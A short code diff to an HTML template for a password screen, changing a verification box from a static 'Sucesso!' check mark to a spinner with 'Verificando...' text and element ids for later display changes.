@@ -183,9 +183,10 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
     </div>
 
     <div class="cf-box">
-      <div class="cf-left">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <span>Sucesso!</span>
+      <div class="cf-left" id="cf-left">
+        <div class="cf-spinner" id="cf-spinner"></div>
+        <svg id="cf-check" style="display:none" width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span id="cf-text">Verificando...</span>
       </div>
       <div class="cf-right">
         <svg width="34" height="14" viewBox="0 0 88 36" xmlns="http://www.w3.org/2000/svg">
